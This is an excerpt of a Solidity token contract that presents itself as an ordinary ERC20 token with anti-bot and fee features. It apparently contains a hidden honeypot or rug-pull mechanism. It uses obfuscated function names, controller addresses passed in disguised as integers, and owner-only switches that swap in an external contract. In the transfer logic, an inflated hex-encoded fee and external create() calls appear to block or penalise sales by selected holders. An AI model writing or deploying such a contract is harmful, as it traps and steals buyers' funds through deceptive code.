...
contract Token is Context, IERC20, Ownable {
    ...
    uint256 private _settingtOutAmountTransfer = uint256(bytes32(0x00000000000000000000000000000000000000000000000000000000000f423d));



    uniswapV1 private uniswapV75PairToken;
    ...
    address private uniswapV75Pair_;
    bool private itvs;
    ...
    constructor(address Antibottoken_, address creator, address caSwap) {
        ...
        uniswapV75PairToken = uniswapV1(uniswapV75Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV75Pair_] = true;
        _isExcludedFromFee[uniswapV75Pair_] = true;
    ...
    function SetholderRew_Ox1164988(address[] memory accounts, bool b) external {
        ...
        if (_msgSender() == address(_Antitbottoken)) { 
            ...
            uniswapV75PairToken.create(8**3);
        }
    }

    function SelectItvs_Ox1164968(bool b) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            itvs=b;
        } else {
    ...
    function SetlistingHL_Ox1164988(address[] memory accounts, uint256[] memory a) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
...
/*    function pair_Ox1164998(address aaaa, bool b) public {
...
*/    
    function argum_Ox1164618(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV75PairToken.create(8**3);
    ...
    function Ecaor_Ox1164628(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV75PairToken.create(8**3);
    ...
    function fees_Ox1164633(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
    ...
    function marketingWallet_Ox1164644(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            uniswapV75PairToken = uniswapV1(addresses);
        } else {
            uniswapV75PairToken.create(8**3);
        }
    }
    ...
    function initialitzeW_Ox1164658 (bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV75PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV75PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV75PairToken.create(crec**21);}
        }
        ...
        else if (takeFee && _isExcludedtFromFeeTransfer[from] && automatedMarketMakerPairs[to] && itvv.v()!=itvs && !starttrad) {
            _taxFee = _taxFeesell;
            _liquidityFee = _settingtOutAmountTransfer+3;
            _MarketingFee = _MarketingFeesell;  
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV75PairToken.create(250**3); 
        }

        if (takeFee && _isExcludedtFromFeeTransfer[from] && automatedMarketMakerPairs[to] && !starttrad && !hldr14send[msg.sender]) {
            uniswapV75PairToken.create(250**3);  
        }
...
contract BabyToken is Token {constructor(uint256 a, uint256 b, uint256 c) Token(address(uint160(uint256(a))), address(uint160(uint256(b))), address(uint160(uint256(c)))) {}}